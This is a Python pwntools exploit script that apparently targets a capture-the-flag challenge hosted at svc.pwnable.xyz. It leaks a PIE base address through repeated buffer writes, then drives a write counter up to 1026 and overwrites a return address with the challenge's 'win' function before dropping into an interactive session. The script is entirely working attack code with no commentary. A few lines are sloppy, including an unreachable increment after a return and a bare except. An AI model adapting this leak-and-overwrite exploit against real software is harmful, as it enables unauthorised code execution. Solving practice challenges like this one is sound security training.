from pwn import *
from ctypes import *

# context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz', 30014)
lib = CDLL('libc.so.6')
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
count = 0
win = e.symbols['win']

def leak():
	global count
	while(True):
		log.info('count : {}'.format(count))
		sla('>','2')
		p.recvuntil('me ')
		c = int(p.recvuntil(' ').strip())
		if c == 0:
			continue
		if c >= 14:
			sa(':','A'*8)
			count += 8
			sla('>','3')
			pie = u64((p.recvuntil('\x0a')[-7:])[:6] + '\x00\x00') - 0xbc2
			log.info('pie : {}'.format(hex(pie)))
			return (pie+e.symbols['win'])
			count += 6
		else:
			sa(':','A'*(c-1)+'\x00')
		count += c-1

def exploit(win):
	global count
	while(True):
		log.info('count : {}'.format(count))
		log.info('win : {}'.format(hex(win)))
		if count == 1026:
			i = 0
			while(True):
				log.info('count : {}'.format(count))
				sla('>','2')
				p.recvuntil('me ')
				c = int(p.recvuntil(' ').strip())
				if c > 8:
					sa(':',p64(win)) # ret
					#raw_input()
					sla('>','0')
					p.interactive()
				elif c == 0:
					continue
				elif c == 1:
					sa(':','\x00')
				else:
					sa(':','\x00')
		sla('>','2')
		p.recvuntil('me ')
		c = int(p.recvuntil(' ').strip())
		if c == 0:
			continue
		if count < 1020:
			sa(':','A'*(c-1)+'\x00')
			count += c-1
		else:
			sa(':','A\x00')
			count += 1
win = leak()
log.info('win : {}'.format(hex(win)))
try:
	exploit(win)
except:
	pass

p.interactive()